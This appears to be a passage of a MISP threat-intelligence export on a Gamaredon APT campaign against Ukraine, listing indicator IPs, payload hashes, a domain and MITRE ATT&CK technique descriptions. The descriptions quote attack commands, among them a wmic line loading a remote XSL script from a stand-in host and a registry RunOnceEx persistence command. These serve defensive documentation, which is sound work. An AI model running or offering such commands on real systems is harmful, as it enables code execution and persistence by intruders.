{"response": [{"Event":{"id":"1296","orgc_id":"1","org_id":"1","date":"2020-02-04","threat_level_id":"2","info":"2020-02-03: Gamaredon APT Targeting Ukraine","published":true,"uuid":"5e39ffc4-cd30-495f-85d1-13a168f8e8cf","attribute_count":"7","analysis":"0","timestamp":"1580860603","distribution":"1","proposal_email_lock":false,"locked":false,"publish_timestamp":"1580860649","sharing_group_id":"0","disable_correlation":false,"extends_uuid":"","event_creator_email":"vitali.kremez@gmail.com","Org":{"id":"1","name":"VK_INTEL_EVIL","uuid":"5d2fbc3a-e520-4bf9-89b7-1b0a68f8e8cf"},"Orgc":{"id":"1","name":"VK_INTEL_EVIL","uuid":"5d2fbc3a-e520-4bf9-89b7-1b0a68f8e8cf"},"Attribute":[{"id":"227842","type":"ip-dst","category":"Network activity","to_ids":true,"uuid":"5e3a0321-7824-4dd3-ab76-145119d2faa1","event_id":"1296","distribution":"5","timestamp":"1580860280","comment":"First-layer proxy IP","sharing_group_id":"0","deleted":false,"disable_correlation":false,"object_id":"0","object_relation":null,"value":"141.8.195.60","Galaxy":[],"ShadowAttribute":[]},{"id":"227843","type":"ip-dst","category":"Network activity","to_ids":true,"uuid":"5e3a0321-e374-4b63-bf77-145119d2faa1","event_id":"1296","distribution":"5","timestamp":"1580860283","comment":"First-layer proxy IP","sharing_group_id":"0","deleted":false,"disable_correlation":false,"object_id":"0","object_relation":null,"value":"188.225.25.50","Galaxy":[],"ShadowAttribute":[]},{"id":"227844","type":"sha256","category":"Payload delivery","to_ids":true,"uuid":"5e3a0321-7fac-48ad-b767-145119d2faa1","event_id":"1296","distribution":"5","timestamp":"1580860193","comment":"","sharing_group_id":"0","deleted":false,"disable_correlation":false,"object_id":"0","object_relation":null,"value":"c1524a4573bc6acbe59e559c2596975c657ae6bbc0b64f943fffca663b98a95f","Galaxy":[],"ShadowAttribute":[]},{"id":"227845","type":"sha256","category":"Payload delivery","to_ids":true,"uuid":"5e3a0321-6d0c-4103-bcf2-145119d2faa1","event_id":"1296","distribution":"5","timestamp":"1580860193","comment":"","sharing_group_id":"0","deleted":false,"disable_correlation":false,"object_id":"0","object_relation":null,"value":"76ea98e1861c1264b340cf3748c3ec74473b04d042cd6bfda9ce51d086cb5a1a","Galaxy":[],"ShadowAttribute":[]},{"id":"227846","type":"sha256","category":"Payload delivery","to_ids":true,"uuid":"5e3a0321-fb64-4012-840a-145119d2faa1","event_id":"1296","distribution":"5","timestamp":"1580860193","comment":"","sharing_group_id":"0","deleted":false,"disable_correlation":false,"object_id":"0","object_relation":null,"value":"e2cb06e0a5c14b4c5f58d0e56a1dc10b6a1007cf56c77ae6cb07946c3dfe82d8","Galaxy":[],"ShadowAttribute":[]},{"id":"227847","type":"sha256","category":"Payload delivery","to_ids":true,"uuid":"5e3a0321-81b4-4ae4-85e8-145119d2faa1","event_id":"1296","distribution":"5","timestamp":"1580860193","comment":"","sharing_group_id":"0","deleted":false,"disable_correlation":false,"object_id":"0","object_relation":null,"value":"39c6884526e7b7f2ed6e47b630010508bb5957385eccf248c961cbd5bcb802c6","Galaxy":[],"ShadowAttribute":[]},{"id":"227848","type":"domain","category":"Network activity","to_ids":true,"uuid":"5e3a0367-83c8-42d6-96d7-144d68f8e8cf","event_id":"1296","distribution":"5","timestamp":"1580860263","comment":"Gamaredon Relevant First-Layer Domain","sharing_group_id":"0","deleted":false,"disable_correlation":false,"object_id":"0","object_relation":null,"value":"masseffect.space","Galaxy":[],"ShadowAttribute":[]}],"ShadowAttribute":[],"RelatedEvent":[],"Galaxy":[{"id":"9","uuid":"c4e851fa-775f-11e7-8163-b774922098cd","name":"Attack Pattern","type":"mitre-attack-pattern","description":"ATT&CK Tactic","version":"8","icon":"map","namespace":"mitre-attack","kill_chain_order":{"mitre-attack":["initial-access","execution","persistence","privilege-escalation","defense-evasion","credential-access","discovery","lateral-movement","collection","command-and-control","exfiltration","impact"],"mitre-mobile-attack":["initial-access","persistence","privilege-escalation","defense-evasion","credential-access","discovery","lateral-movement","effects","collection","exfiltration","command-and-control","network-effects","remote-service-effects"],"mitre-pre-attack":["priority-definition-planning","priority-definition-direction","target-selection","technical-information-gathering","people-information-gathering","organizational-information-gathering","technical-weakness-identification","people-weakness-identification","organizational-weakness-identification","adversary-opsec","establish-&-maintain-infrastructure","persona-development","build-capabilities","test-capabilities","stage-capabilities"]},"GalaxyCluster":[{"id":"1199","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Spearphishing Link - T1192","tag_name":"misp-galaxy:mitre-attack-pattern=\"Spearphishing Link - T1192\"","description":"Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https:\/\/attack.mitre.org\/techniques\/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs\/web beacons).","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"20138b9d-1aac-4a26-8654-a36b6bbf2bba","tag_id":"726","meta":{"external_id":["CAPEC-163"],"kill_chain":["mitre-attack:initial-access"],"mitre_data_sources":["Packet capture","Web proxy","Email gateway","Detonation chamber","SSL\/TLS inspection","DNS records","Mail server"],"mitre_platforms":["Windows","macOS","Linux"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1192","https:\/\/capec.mitre.org\/data\/definitions\/163.html"]},"local":false},{"id":"1205","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Spearphishing Attachment - T1193","tag_name":"misp-galaxy:mitre-attack-pattern=\"Spearphishing Attachment - T1193\"","description":"Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https:\/\/attack.mitre.org\/techniques\/T1204) to gain execution.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"6aac77c4-eaf2-4366-8c13-ce50ab951f38","tag_id":"727","meta":{"external_id":["CAPEC-163"],"kill_chain":["mitre-attack:initial-access"],"mitre_data_sources":["File monitoring","Packet capture","Network intrusion detection system","Detonation chamber","Email gateway","Mail server"],"mitre_platforms":["Windows","macOS","Linux"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1193","https:\/\/capec.mitre.org\/data\/definitions\/163.html"]},"local":false},{"id":"1115","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Command-Line Interface - T1059","tag_name":"misp-galaxy:mitre-attack-pattern=\"Command-Line Interface - T1059\"","description":"Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https:\/\/attack.mitre.org\/software\/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https:\/\/attack.mitre.org\/techniques\/T1053)).\n\nAdversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"7385dfaf-6886-4229-9ecd-6fd678040830","tag_id":"728","meta":{"external_id":["T1059"],"kill_chain":["mitre-attack:execution"],"mitre_data_sources":["Process monitoring","Process command-line parameters"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1059","https:\/\/en.wikipedia.org\/wiki\/Command-line_interface"]},"local":false},{"id":"1165","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Scheduled Task - T1053","tag_name":"misp-galaxy:mitre-attack-pattern=\"Scheduled Task - T1053\"","description":"Utilities such as [at](https:\/\/attack.mitre.org\/software\/S0110) and [schtasks](https:\/\/attack.mitre.org\/software\/S0111), along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system. (Citation: TechNet Task Scheduler Security)\n\nAn adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"35dd844a-b219-4e2b-a6bb-efa9a75995a9","tag_id":"766","meta":{"external_id":["CAPEC-557"],"kill_chain":["mitre-attack:execution","mitre-attack:persistence","mitre-attack:privilege-escalation"],"mitre_data_sources":["File monitoring","Process monitoring","Process command-line parameters","Windows event logs"],"mitre_platforms":["Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1053","https:\/\/capec.mitre.org\/data\/definitions\/557.html","https:\/\/technet.microsoft.com\/en-us\/library\/cc785125.aspx","https:\/\/technet.microsoft.com\/en-us\/sysinternals\/bb963902","https:\/\/twitter.com\/leoloobeek\/status\/939248813465853953","https:\/\/social.technet.microsoft.com\/Forums\/en-US\/e5bca729-52e7-4fcb-ba12-3225c564674c\/scheduled-tasks-history-retention-settings?forum=winserver8gen","https:\/\/technet.microsoft.com\/library\/dd315590.aspx"]},"local":false},{"id":"1248","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Scripting - T1064","tag_name":"misp-galaxy:mitre-attack-pattern=\"Scripting - T1064\"","description":"Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\n\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https:\/\/attack.mitre.org\/techniques\/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https:\/\/attack.mitre.org\/techniques\/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.\n\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. (Citation: Metasploit) (Citation: Metasploit),  (Citation: Veil) (Citation: Veil), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"7fd87010-3a00-4da3-b905-410525e8ec44","tag_id":"729","meta":{"external_id":["T1064"],"kill_chain":["mitre-attack:defense-evasion","mitre-attack:execution"],"mitre_data_sources":["Process monitoring","File monitoring","Process command-line parameters"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1064","http:\/\/www.metasploit.com","https:\/\/www.veil-framework.com\/framework\/","https:\/\/github.com\/mattifestation\/PowerSploit","https:\/\/blog.crowdstrike.com\/deep-thought-chinese-targeting-national-security-think-tanks\/","https:\/\/www.uperesia.com\/analyzing-malicious-office-documents"]},"local":false},{"id":"1154","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"User Execution - T1204","tag_name":"misp-galaxy:mitre-attack-pattern=\"User Execution - T1204\"","description":"An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [Spearphishing Attachment](https:\/\/attack.mitre.org\/techniques\/T1193) with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [Spearphishing Link](https:\/\/attack.mitre.org\/techniques\/T1192) that leads to exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https:\/\/attack.mitre.org\/techniques\/T1203). While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"8c32eb4d-805f-4fc5-bf60-c4d476c131b5","tag_id":"800","meta":{"external_id":["T1204"],"kill_chain":["mitre-attack:execution"],"mitre_data_sources":["Anti-virus","Process command-line parameters","Process monitoring"],"mitre_platforms":["Linux","Windows","macOS"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1204"]},"local":false},{"id":"1001","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"XSL Script Processing - T1220","tag_name":"misp-galaxy:mitre-attack-pattern=\"XSL Script Processing - T1220\"","description":"Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to [Trusted Developer Utilities](https:\/\/attack.mitre.org\/techniques\/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018)\n\nCommand-line example: (Citation: Penetration Testing Lab MSXSL July 2017)\n\n* <code>msxsl.exe customers[.]xml script[.]xsl<\/code>\n\nAnother variation of this technique, dubbed \u201cSquiblytwo\u201d, involves using [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) to invoke JScript or VBScript within an XSL file. (Citation: subTee WMIC XSL APR 2018) This technique can also execute local\/remote scripts and, similar to its [Regsvr32](https:\/\/attack.mitre.org\/techniques\/T1117)\/ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool.\n\nCommand-line examples: (Citation: subTee WMIC XSL APR 2018)\n\n* Local File: <code>wmic process list \/FORMAT:evil[.]xsl<\/code>\n* Remote File: <code>wmic os get \/FORMAT:\u201dhttps[:]\/\/example[.]com\/evil[.]xsl\u201d<\/code>","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"ebbe170d-aa74-4946-8511-9921243415a3","tag_id":"801","meta":{"external_id":["T1220"],"kill_chain":["mitre-attack:defense-evasion","mitre-attack:execution"],"mitre_data_sources":["Process monitoring","Process command-line parameters","Process use of network","DLL monitoring"],"mitre_platforms":["Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1220","https:\/\/docs.microsoft.com\/dotnet\/standard\/data\/xml\/xslt-stylesheet-scripting-using-msxsl-script","https:\/\/www.microsoft.com\/download\/details.aspx?id=21714","https:\/\/pentestlab.blog\/2017\/07\/06\/applocker-bypass-msxsl\/","https:\/\/subt0x11.blogspot.com\/2018\/04\/wmicexe-whitelisting-bypass-hacking.html","https:\/\/twitter.com\/dez_\/status\/986614411711442944","https:\/\/reaqta.com\/2018\/03\/spear-phishing-campaign-leveraging-msxsl\/"]},"local":false},{"id":"1014","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Windows Management Instrumentation - T1047","tag_name":"misp-galaxy:mitre-attack-pattern=\"Windows Management Instrumentation - T1047\"","description":"Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI 2015)","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"01a5a209-b94c-450b-b7f9-946497d91055","tag_id":"802","meta":{"external_id":["T1047"],"kill_chain":["mitre-attack:execution"],"mitre_data_sources":["Authentication logs","Netflow\/Enclave netflow","Process monitoring","Process command-line parameters"],"mitre_platforms":["Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1047","https:\/\/msdn.microsoft.com\/en-us\/library\/aa394582.aspx","https:\/\/www.fireeye.com\/content\/dam\/fireeye-www\/global\/en\/current-threats\/pdfs\/wp-windows-management-instrumentation.pdf","https:\/\/en.wikipedia.org\/wiki\/Server_Message_Block","https:\/\/technet.microsoft.com\/en-us\/library\/cc787851.aspx"]},"local":false},{"id":"935","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Hidden Files and Directories - T1158","tag_name":"misp-galaxy:mitre-attack-pattern=\"Hidden Files and Directories - T1158\"","description":"To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir \/a<\/code> for Windows and <code>ls \u2013a<\/code> for Linux and macOS).\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.\n\n### Windows\n\nUsers can mark specific files as hidden by using the attrib.exe binary. Simply do <code>attrib +h filename<\/code> to mark a file or folder as hidden. Similarly, the \u201c+s\u201d marks a file as a system file and the \u201c+r\u201d flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively \u201c\/S\u201d.\n\n### Linux\/Mac\n\nUsers can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folder that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles YES<\/code>, and then relaunch the Finder Application.\n\n### Mac\n\nFiles on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker).\nMany applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"dc27c2ec-c5f9-4228-ba57-d67b590bda93","tag_id":"803","meta":{"external_id":["T1158"],"kill_chain":["mitre-attack:defense-evasion","mitre-attack:persistence"],"mitre_data_sources":["File monitoring","Process monitoring","Process command-line parameters"],"mitre_platforms":["Linux","macOS","Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1158","https:\/\/researchcenter.paloaltonetworks.com\/2016\/09\/unit42-sofacys-komplex-os-x-trojan\/","https:\/\/blog.malwarebytes.com\/threat-analysis\/2017\/01\/new-mac-backdoor-using-antiquated-code\/","https:\/\/www.paloaltonetworks.com\/content\/dam\/pan\/en_US\/assets\/pdf\/reports\/Unit_42\/unit42-wirelurker.pdf"]},"local":false},{"id":"1052","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Local Job Scheduling - T1168","tag_name":"misp-galaxy:mitre-attack-pattern=\"Local Job Scheduling - T1168\"","description":"On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike [Scheduled Task](https:\/\/attack.mitre.org\/techniques\/T1053) on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).\n\n### cron\n\nSystem-wide cron jobs are installed by modifying <code>\/etc\/crontab<\/code> file, <code>\/etc\/cron.d\/<\/code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.\n\nThose methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.\n\n### at\n\nThe at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and\/or time, which could also be used for the same purposes.\n\n### launchd\n\nEach launchd job is described by a different configuration property list (plist) file similar to [Launch Daemon](https:\/\/attack.mitre.org\/techniques\/T1160) or [Launch Agent](https:\/\/attack.mitre.org\/techniques\/T1159), except there is an additional key called <code>StartCalendarInterval<\/code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"c0a384a4-9a25-40e1-97b6-458388474bc8","tag_id":"765","meta":{"external_id":["T1168"],"kill_chain":["mitre-attack:persistence","mitre-attack:execution"],"mitre_data_sources":["File monitoring","Process monitoring"],"mitre_platforms":["Linux","macOS"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1168","https:\/\/developer.apple.com\/library\/content\/documentation\/MacOSX\/Conceptual\/BPSystemStartup\/Chapters\/ScheduledJobs.html","http:\/\/www.thesafemac.com\/new-signed-malware-called-janicab\/","https:\/\/www.virusbulletin.com\/uploads\/pdf\/conference\/vb2014\/VB2014-Wardle.pdf","https:\/\/www.rsaconference.com\/writable\/presentations\/file_upload\/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf","https:\/\/linux.die.net\/man\/5\/crontab","https:\/\/linux.die.net\/man\/1\/at","https:\/\/blog.avast.com\/2015\/01\/06\/linux-ddos-trojan-hiding-itself-with-an-embedded-rootkit\/"]},"local":false},{"id":"796","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Registry Run Keys \/ Startup Folder - T1060","tag_name":"misp-galaxy:mitre-attack-pattern=\"Registry Run Keys \/ Startup Folder - T1060\"","description":"Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<\/code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce<\/code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run<\/code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce<\/code>\n\nThe <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx<\/code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend \/v 1 \/d \"C:\\temp\\evil[.]dll\"<\/code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders<\/code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<\/code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders<\/code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders<\/code>\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https:\/\/attack.mitre.org\/techniques\/T1036) to make the Registry entries look as if they are associated with legitimate programs.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"9422fc14-1c43-410d-ab0f-a709b76c72dc","tag_id":"767","meta":{"external_id":["CAPEC-270"],"kill_chain":["mitre-attack:persistence"],"mitre_data_sources":["Windows Registry","File monitoring"],"mitre_platforms":["Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1060","https:\/\/capec.mitre.org\/data\/definitions\/270.html","http:\/\/msdn.microsoft.com\/en-us\/library\/aa376977","https:\/\/support.microsoft.com\/help\/310593\/description-of-the-runonceex-registry-key","https:\/\/oddvar.moe\/2018\/03\/21\/persistence-using-runonceex-hidden-from-autoruns-exe\/","https:\/\/technet.microsoft.com\/en-us\/sysinternals\/bb963902"]},"local":false},{"id":"1216","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Startup Items - T1165","tag_name":"misp-galaxy:mitre-attack-pattern=\"Startup Items - T1165\"","description":"Per Apple\u2019s documentation, startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items (Citation: Startup Items). This is technically a deprecated version (superseded by Launch Daemons), and thus the appropriate folder, <code>\/Library\/StartupItems<\/code> isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist<\/code>, reside in the top-level directory. \n\nAn adversary can create the appropriate folders\/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as root. If an adversary is able to modify an existing Startup Item, then they will be able to Privilege Escalate as well.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"2ba5aa71-9d15-4b22-b726-56af06d9ad2f","tag_id":"804","meta":{"external_id":["T1165"],"kill_chain":["mitre-attack:persistence","mitre-attack:privilege-escalation"],"mitre_data_sources":["File monitoring","Process monitoring"],"mitre_platforms":["macOS"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1165","https:\/\/developer.apple.com\/library\/content\/documentation\/MacOSX\/Conceptual\/BPSystemStartup\/Chapters\/StartupItems.html","https:\/\/www.virusbulletin.com\/uploads\/pdf\/conference\/vb2014\/VB2014-Wardle.pdf"]},"local":false},{"id":"1153","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"Shortcut Modification - T1023","tag_name":"misp-galaxy:mitre-attack-pattern=\"Shortcut Modification - T1023\"","description":"Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https:\/\/attack.mitre.org\/techniques\/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.","galaxy_id":"9","source":"https:\/\/github.com\/mitre\/cti","authors":["MITRE"],"version":"9","uuid":"970cdb5c-02fb-4c38-b17e-d6327cf3c810","tag_id":"805","meta":{"external_id":["T1023"],"kill_chain":["mitre-attack:persistence"],"mitre_data_sources":["File monitoring","Process monitoring","Process command-line parameters"],"mitre_platforms":["Windows"],"refs":["https:\/\/attack.mitre.org\/techniques\/T1023"]},"local":false},{"id":"1132","collection_uuid":"dcb864dc-775f-11e7-9fbb-1f41b4996683","type":"mitre-attack-pattern","value":"New Service - T1050","tag_name":"misp-galaxy:mitre-attack-pattern=\"New Service - T1050\"","description":"When operating systems boot up, they can start programs or applications called services that perform background system functions. (Citation: TechNet Services) A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry. \n\nAdversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry. The service name may be disguised by using a name from a related operating system or benign software with [Masquerading](https:\/\/attack.mitre.org\/techniques\/T1036). Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service 